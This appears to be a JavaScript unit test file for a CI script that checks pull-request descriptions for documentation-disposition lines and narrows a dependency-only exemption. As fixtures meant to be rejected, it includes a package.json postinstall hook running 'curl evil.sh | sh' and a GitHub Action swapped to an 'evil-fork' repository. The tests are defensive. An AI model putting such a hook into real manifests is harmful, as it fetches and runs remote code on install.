/**
 * check-docs-disposition.test.js — Unit tests for the PR-body section format
 * check (scripts/check-docs-disposition.js) that gates CI. Every PR carries a
 * "## Docs disposition" section (one line per governing doc, plus one per
 * judgment-only clause) and a "## Change record"; these tests prove the red
 * paths fire (missing/unexpected/duplicate/malformed lines, missing sections
 * and markers), that the shipped PR template's HTML comments are inert in both
 * directions, and that the declared dependency-only exemption is exactly as
 * narrow as documented (dependency blocks and same-action pin bumps only).
 */

import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import path from 'node:path';
import {
  changedLines,
  isPinOnlyWorkflowDiff,
  isDependencyOnlyPackageJsonDiff,
  isDependencyOnlyCargoTomlDiff,
  isExemptDiff,
  docsInScope,
  expectedDispositionLines,
  parseDispositionSection,
  stripHtmlComments,
  extractSection,
  auditBody,
} from '../../../../scripts/check-docs-disposition.js';

const MAP = {
  description: 'test map',
  'repo-wide': { description: 'x', docs: ['README.md', 'docs/hub.md'] },
  areas: {
    alpha: { code: ['packages/alpha/**'], docs: ['docs/alpha.md', 'docs/hub.md'] },
    tooling: { code: ['scripts/**'], docs: ['docs/tooling.md'] },
  },
  unassigned: [],
};

const REGISTRY = {
  description: 'test registry',
  prefixes: { AL: 'docs/alpha.md' },
  retired: { AL: [] },
  clauses: [
    { doc: 'docs/alpha.md', clause: 'AL-1', tag: 'judgment-only', justification: 'x' },
    { doc: 'docs/alpha.md', clause: 'AL-2', tag: 'check-exists', 'check-ref': 'scripts/x.js' },
    { doc: 'docs/alpha.md', clause: 'AL-3', tag: 'judgment-only', justification: 'y' },
  ],
};

const noContent = () => null;

const SHA_A = 'a'.repeat(40);
const SHA_B = 'b'.repeat(40);

/** Minimal unified diff: context lines prefixed ' ', changes '+'/'-'. */
const diff = (lines) => ['--- a/f', '+++ b/f', '@@ -1 +1 @@', ...lines].join('\n');

describe('changedLines', () => {
  it('keeps content that begins with + or - at column 0, drops only file headers', () => {
    const text = diff(['+- a yaml list item', '-removed', ' context']);
    assert.deepEqual(changedLines(text), ['- a yaml list item', 'removed']);
  });
});

describe('isPinOnlyWorkflowDiff — the pin-bump exemption has teeth', () => {
  it('accepts a same-action SHA bump', () => {
    const text = diff([
      `-      - uses: actions/checkout@${SHA_A} # v6`,
      `+      - uses: actions/checkout@${SHA_B} # v7`,
    ]);
    assert.equal(isPinOnlyWorkflowDiff(text), true);
  });

  it('rejects an action identity swap even when both lines are pin-shaped', () => {
    const text = diff([
      `-      - uses: actions/checkout@${SHA_A} # v6`,
      `+      - uses: evil-fork/checkout@${SHA_B} # v6`,
    ]);
    assert.equal(isPinOnlyWorkflowDiff(text), false);
  });

  it('rejects short pins, non-pin lines, and rider content starting with -', () => {
    assert.equal(
      isPinOnlyWorkflowDiff(
        diff([`-      - uses: a/b@${'a'.repeat(7)}`, `+      - uses: a/b@${'b'.repeat(7)}`]),
      ),
      false,
    );
    assert.equal(isPinOnlyWorkflowDiff(diff([`+        run: npm run lint`])), false);
    const rider = diff([
      `-      - uses: actions/checkout@${SHA_A}`,
      `+      - uses: actions/checkout@${SHA_B}`,
      '+- a column-zero rider line',
    ]);
    assert.equal(isPinOnlyWorkflowDiff(rider), false);
  });

  it('rejects an empty diff', () => {
    assert.equal(isPinOnlyWorkflowDiff(diff([' unchanged'])), false);
  });
});

describe('isDependencyOnlyPackageJsonDiff', () => {
  it('accepts a version bump inside a dependency block', () => {
    const text = diff([
      '   "devDependencies": {',
      '-    "left-pad": "^1.0.0",',
      '+    "left-pad": "^1.3.0",',
      '     "other": "^2.0.0"',
      '   }',
    ]);
    assert.equal(isDependencyOnlyPackageJsonDiff(text), true);
  });

  it('rejects a change outside a dependency block — npm scripts are real changes', () => {
    const text = diff([
      '   "scripts": {',
      '-    "lint:area-map": "node scripts/check-area-map.js",',
      '+    "lint:area-map": "echo skipped",',
      '   }',
    ]);
    assert.equal(isDependencyOnlyPackageJsonDiff(text), false);
  });

  it('rejects a change after the dependency block closes', () => {
    const text = diff([
      '   "devDependencies": {',
      '     "left-pad": "^1.0.0"',
      '   },',
      '+  "postinstall": "curl evil.sh | sh",',
    ]);
    assert.equal(isDependencyOnlyPackageJsonDiff(text), false);
  });

  it('rejects an empty diff', () => {
    assert.equal(isDependencyOnlyPackageJsonDiff(diff([' unchanged'])), false);
  });
});

describe('isDependencyOnlyCargoTomlDiff', () => {
  it('accepts a bump inside [dependencies] and rejects one outside', () => {
    const inside = diff([' [dependencies]', '-serde = "1.0.0"', '+serde = "1.0.1"']);
    assert.equal(isDependencyOnlyCargoTomlDiff(inside), true);
    const outside = diff([' [package]', '-version = "1.0.0"', '+version = "2.0.0"']);
    assert.equal(isDependencyOnlyCargoTomlDiff(outside), false);
  });
});

describe('isExemptDiff — the declared dependency-only exemption', () => {
  const depBump = diff([
    '   "dependencies": {',
    '-    "a": "^1.0.0",',
    '+    "a": "^1.1.0",',
    '   }',
  ]);
  const pinBump = diff([
    `-      - uses: actions/checkout@${SHA_A}`,
    `+      - uses: actions/checkout@${SHA_B}`,
  ]);

  it('exempts lockfiles, dependency-block manifest bumps, and pin bumps together', () => {
    const diffs = {
      'package-lock.json': 'anything',
      'packages/extension/package.json': depBump,
      '.github/workflows/test.yml': pinBump,
      'packages/desktop/src-tauri/Cargo.lock': 'anything',
    };
    assert.equal(isExemptDiff({ files: Object.keys(diffs), fileDiff: (f) => diffs[f] }), true);
  });

  it('does not exempt a manifest whose diff leaves the dependency blocks', () => {
    const scripts = diff(['   "scripts": {', '+    "postinstall": "x",', '   }']);
    assert.equal(isExemptDiff({ files: ['package.json'], fileDiff: () => scripts }), false);
  });

  it('does not exempt mixed diffs or empty file lists', () => {
    assert.equal(
      isExemptDiff({
        files: ['package-lock.json', 'packages/alpha/index.js'],
        fileDiff: () => depBump,
      }),
      false,
    );
    assert.equal(isExemptDiff({ files: [], fileDiff: () => '' }), false);
  });
});

describe('docsInScope', () => {
  it('collects the resolved areas doc sets for changed code', () => {
    assert.deepEqual(
      docsInScope({ files: ['packages/alpha/x.js'], map: MAP, readFile: noContent }),
      ['docs/alpha.md', 'docs/hub.md'],
    );
  });

  it('includes an edited repo-wide doc that belongs to no doc set', () => {
    assert.deepEqual(docsInScope({ files: ['README.md'], map: MAP, readFile: noContent }), [
      'README.md',
    ]);
  });

  it('routes a repo-wide doc that sits in a doc set through its areas (no self-duplication)', () => {
    assert.deepEqual(docsInScope({ files: ['docs/hub.md'], map: MAP, readFile: noContent }), [
      'docs/alpha.md',
      'docs/hub.md',
    ]);
  });

  it('resolves via a pointer comment when file content names a governing doc', () => {
    assert.deepEqual(
      docsInScope({ files: ['tools/free.rs'], map: MAP, readFile: () => '// see docs/alpha.md' }),
      ['docs/alpha.md', 'docs/hub.md'],
    );
  });
});

describe('expectedDispositionLines', () => {
  it('emits one doc-level line plus one per judgment-only clause', () => {
    assert.deepEqual(
      expectedDispositionLines({ docs: ['docs/alpha.md', 'docs/tooling.md'], registry: REGISTRY }),
      [
        { doc: 'docs/alpha.md', clause: null },
        { doc: 'docs/alpha.md', clause: 'AL-1' },
        { doc: 'docs/alpha.md', clause: 'AL-3' },
        { doc: 'docs/tooling.md', clause: null },
      ],
    );
  });
});

describe('stripHtmlComments', () => {
  it('removes single-line, multi-line, and unterminated comments', () => {
    const text = 'keep\n<!-- gone -->\n<!-- multi\nline\ngone -->\nkeep2\n<!-- open forever\ngone';
    assert.equal(stripHtmlComments(text), 'keep\n\n\nkeep2\n');
  });
});

describe('parseDispositionSection', () => {
  it('parses verbs, docs, clause anchors, and text — markdown prefixes tolerated', () => {
    const { lines, malformed } = parseDispositionSection(
      [
        'unaffected: docs/alpha.md — nothing here changes capture',
        '- updated: docs/tooling.md — documented the new check',
        '1. unaffected: docs/alpha.md §AL-1 — comment-only change',
        '> unaffected: docs/alpha.md §AL-3 — quoted but real',
        '**updated:** docs/hub.md — bold verb normalized',
        'unaffected: `docs/beta.md` — backticks stripped',
        'Some prose the author left in.',
      ].join('\n'),
    );
    assert.equal(malformed.length, 0);
    assert.deepEqual(
      lines.map((l) => [l.verb, l.doc, l.clause]),
      [
        ['unaffected', 'docs/alpha.md', null],
        ['updated', 'docs/tooling.md', null],
        ['unaffected', 'docs/alpha.md', 'AL-1'],
        ['unaffected', 'docs/alpha.md', 'AL-3'],
        ['updated', 'docs/hub.md', null],
        ['unaffected', 'docs/beta.md', null],
      ],
    );
  });

  it('collects lines that try to be dispositions but do not parse', () => {
    const { lines, malformed } = parseDispositionSection('updated docs/alpha.md missing colon\n');
    assert.deepEqual(lines, []);
    assert.deepEqual(malformed, ['updated docs/alpha.md missing colon']);
  });
});

describe('extractSection', () => {
  const body = '# T\n\n## Docs disposition\n\nline1\n\n## Change record\n\nIntent: x\n';

  it('extracts a section up to the next heading, case-insensitively', () => {
    assert.match(extractSection(body, 'Docs disposition'), /line1/);
    assert.doesNotMatch(extractSection(body, 'docs disposition'), /Intent:/);
    assert.match(extractSection(body, 'Change record'), /Intent: x/);
  });

  it('returns null for an absent section', () => {
    assert.equal(extractSection(body, 'Motivation'), null);
  });
});

describe('auditBody', () => {
  const expected = [
    { doc: 'docs/alpha.md', clause: null },
    { doc: 'docs/alpha.md', clause: 'AL-1' },
  ];
  const goodBody = [
    '## Docs disposition',
    '',
    'unaffected: docs/alpha.md — no capture change',
    'unaffected: docs/alpha.md §AL-1 — comment-only',
    '',
    '## Change record',
    '',
    'Intent: test.',
    'Outside knowledge: none.',
    'mutation: no per-change claim; mutation testing runs as a standing weekly job.',
  ].join('\n');

  it('passes a complete body — also with CRLF line endings', () => {
    assert.deepEqual(Object.values(auditBody({ body: goodBody, expected })).flat(), []);
    const crlf = goodBody.replace(/\n/g, '\r\n');
    assert.deepEqual(Object.values(auditBody({ body: crlf, expected })).flat(), []);
  });

  it('reports a missing expected line by its exact anchor', () => {
    const r = auditBody({
      body: goodBody.replace(/unaffected: docs\/alpha\.md §AL-1.*\n/, ''),
      expected,
    });
    assert.deepEqual(r.missing, ['docs/alpha.md §AL-1']);
  });

  it('reports out-of-scope and duplicate lines', () => {
    const noisy = goodBody.replace(
      '## Change record',
      'updated: docs/other.md — not in scope\nunaffected: docs/alpha.md — again\n\n## Change record',
    );
    const r = auditBody({ body: noisy, expected });
    assert.deepEqual(r.unexpected, ['docs/other.md']);
    assert.deepEqual(r.duplicates, ['docs/alpha.md']);
  });

  it('reports both sections when the body has neither', () => {
    const r = auditBody({ body: 'just a description', expected });
    assert.deepEqual(r.missingSections, ['## Docs disposition', '## Change record']);
    assert.deepEqual(r.missing, ['docs/alpha.md', 'docs/alpha.md §AL-1']);
  });

  it('reports missing change-record markers', () => {
    const r = auditBody({
      body: goodBody.replace('Outside knowledge: none.\n', '').replace(/mutation:.*\n?/, ''),
      expected,
    });
    assert.deepEqual(r.changeRecordProblems, [
      'change record has no "Outside knowledge:" line',
      'change record has no "mutation:" line',
    ]);
  });

  it('ignores disposition lines and markers hidden inside HTML comments — both directions', () => {
    // A clause line present only inside a comment must NOT count as present…
    const hidden = goodBody.replace(
      'unaffected: docs/alpha.md §AL-1 — comment-only',
      '<!-- unaffected: docs/alpha.md §AL-1 — invisible in the rendered PR -->',
    );
    assert.deepEqual(auditBody({ body: hidden, expected }).missing, ['docs/alpha.md §AL-1']);

    // …and markers that exist only in the template's comment must not satisfy.
    const emptyRecord = goodBody.replace(
      /Intent: test\.[\s\S]*$/,
      '<!-- Intent: <one sentence>\n Outside knowledge: <or "none">\n mutation: say so. -->\n',
    );
    const r = auditBody({ body: emptyRecord, expected });
    assert.equal(r.changeRecordProblems.length, 3);
  });

  it('requires markers at a line start — a marker quoted mid-prose does not satisfy', () => {
    const midProse = goodBody.replace(
      'Intent: test.',
      'This paragraph mentions the word Intent: casually.',
    );
    const r = auditBody({ body: midProse, expected });
    assert.deepEqual(r.changeRecordProblems, ['change record has no "Intent:" line']);
  });

  it('rejects the shipped PR template as-is (comments are inert, sections are empty)', () => {
    const template = readFileSync(
      path.resolve(import.meta.dirname, '../../../../.github/PULL_REQUEST_TEMPLATE.md'),
      'utf8',
    );
    const r = auditBody({ body: template, expected });
    assert.deepEqual(r.unexpected, []); // nothing inside comments leaks in
    assert.deepEqual(r.missing, ['docs/alpha.md', 'docs/alpha.md §AL-1']);
    assert.equal(r.changeRecordProblems.length, 3);
  });
});
